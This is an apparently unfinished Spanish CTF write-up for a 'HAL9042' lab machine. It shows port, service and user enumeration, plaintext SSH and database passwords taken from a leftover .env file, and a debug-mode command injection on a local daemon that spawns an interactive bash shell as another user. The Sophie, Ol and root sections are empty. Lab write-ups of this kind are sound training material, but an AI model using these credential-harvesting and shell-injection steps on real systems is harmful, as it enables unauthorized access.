# Reconocimiento del servdor

## Enumeración de puertos

```bash
 ss -tulnp
Netid    State     Recv-Q    Send-Q        Local Address:Port         Peer Address:Port    Process
udp      UNCONN    0         0                127.0.0.54:53                0.0.0.0:*
udp      UNCONN    0         0             127.0.0.53%lo:53                0.0.0.0:*
udp      UNCONN    0         0             10.1.0.8%ens3:68                0.0.0.0:*
udp      UNCONN    0         0                   0.0.0.0:1337              0.0.0.0:*
tcp      LISTEN    0         16                127.0.0.1:7042              0.0.0.0:*
tcp      LISTEN    0         5                 127.0.0.1:9000              0.0.0.0:*
tcp      LISTEN    0         511                 0.0.0.0:5042              0.0.0.0:*
tcp      LISTEN    0         4096                0.0.0.0:6060              0.0.0.0:*
tcp      LISTEN    0         2048              127.0.0.1:8000              0.0.0.0:*
tcp      LISTEN    0         4096          127.0.0.53%lo:53                0.0.0.0:*
tcp      LISTEN    0         4096             127.0.0.54:53                0.0.0.0:*
tcp      LISTEN    0         4096                   [::]:6060                 [::]:*
```

## Enumeración de servicios

```bash
systemctl list-unit-files --state=enabled
UNIT FILE                              STATE   PRESET
apport-autoreport.path                 enabled enabled
tpm-udev.path                          enabled enabled
apparmor.service                       enabled enabled
apport.service                         enabled enabled
blk-availability.service               enabled enabled
cloud-config.service                   enabled enabled
cloud-final.service                    enabled enabled
cloud-init-local.service               enabled enabled
cloud-init.service                     enabled enabled
console-setup.service                  enabled enabled
cron.service                           enabled enabled
dmesg.service                          enabled enabled
e2scrub_reap.service                   enabled enabled
finalrd.service                        enabled enabled
flagd.service                          enabled enabled
getty@.service                         enabled enabled
gpu-manager.service                    enabled enabled
grub-common.service                    enabled enabled
grub-initrd-fallback.service           enabled enabled
hal9042-hal.service                    enabled enabled
hal9042-lockdown.service               enabled enabled
hal9042-reviewer.service               enabled enabled
hal9042-telemetry.service              enabled enabled
hal9042-web.service                    enabled enabled
hal9042-whisper.service                enabled enabled
hal9042d.service                       enabled enabled
keyboard-setup.service                 enabled enabled

```

## Enumeración de procesos



## Usuarios y grupos

```bash

...
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
fortytwo:x:1000:1000:fortytwo:/home/fortytwo:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
paco:x:1001:1003::/home/paco:/bin/bash
wil:x:1002:1004::/home/wil:/bin/bash
sophie:x:1003:1005::/home/sophie:/bin/bash
ol:x:1004:1006::/home/ol:/bin/bash
hal:x:9042:9042:HAL9042 Evaluation System,I am completely operational:/home/hal:/bin/sh
halrev:x:999:988::/opt/hal9042/reviewer:/usr/sbin/nologin
```

#### PACO

Pasos para movimiento lateral `www-data` -> `paco`.

```
find / -user paco 2>/dev/null
/home/paco
/home/paco/notes
/home/paco/notes/thoughts.txt
/home/paco/.profile
/home/paco/TODO.md
/home/paco/.env.old
/home/paco/src
/home/paco/src/evaluator.c
/home/paco/.bashrc
/home/paco/.bash_logout
/home/paco/.bash_history
/home/paco/scripts
/home/paco/scripts/encrypt.py
/var/mail/paco
```

```
 cat /home/paco/.env.old
# old deploy env — paco. delete this. (you will not delete this)
DB_PASS=Moulinette2024!
SECRET_KEY=hal9042secret
# ssh creds used by the deploy bot
SSH_USER=paco
SSH_PASS=Pac0_H4L_dev!
```

`~/scripts/encrypt.py`

```python
"""
...
keeps a `.key_part` file:

    part 1 : ol      (~/.config/.key_part)
    part 2 : wil     (~/data/.key_part)
    part 3 : sophie  (~/drafts/.key_part)
    part 4 : xavier  (/tmp/.xn/.key_part)
"""
```
```bash
file /home/ol/.config/.key_part
file /home/wil/data/.key_part
file /home/sophie/drafts/.key_part
file /tmp/.xn/.key_part


/home/ol/.config/.key_part: regular file, no read permission
/home/wil/data/.key_part: regular file, no read permission
/home/sophie/drafts/.key_part: regular file, no read permissio
/tmp/.xn/.key_part: ASCII text
```

Tenemos acceso al trozo de la clave de xavier, por lo tanto extraemos.
```bash
scp -P 6060 paco@10.1.0.8:/tmp/.xn/.key_part xavier.key_part
```

En la carpeta de la clave se hace mención a un usuario eliminado con uid de 1337, buscamos ficheros con ownership.

```bash
 find / -uid  1337 2>/dev/null
/home/xavier
/var/backups/xbackup
/var/backups/.xavier_uid1337.bak
/tmp/.xn
/tmp/.xn/last_message.txt
/tmp/.xn/contact_ol_nov25.txt
/tmp/.xn/.key_part
```

Lanzamos un `strings` al binario y obtenemos otra flag.


evaluator.c + error de backend 127.0.0.1 7042 internal server (debug mode)

```bash
 nc  127.0.0.1 7042
HAL9042 evaluation daemon — v0.4 (build dev)
Submit a project name to evaluate. One line per request.
> DEBUG: /bin/bash -i
bash: cannot set terminal process group (568): Inappropriate ioctl for device
bash: no job control in this shell
wil@hal9042:/$ id
id
uid=1002(wil) gid=1004(wil) groups=1004(wil),1001(evalops)
wil@hal9042:/$

```

### WIL

```bash
wil@hal9042:~$ groups
groups
wil evalops
```

- Extraemos la parte de la clave

Existe `id_rsa_sophie.enc`


### SOPHIE


### OL


### ROOT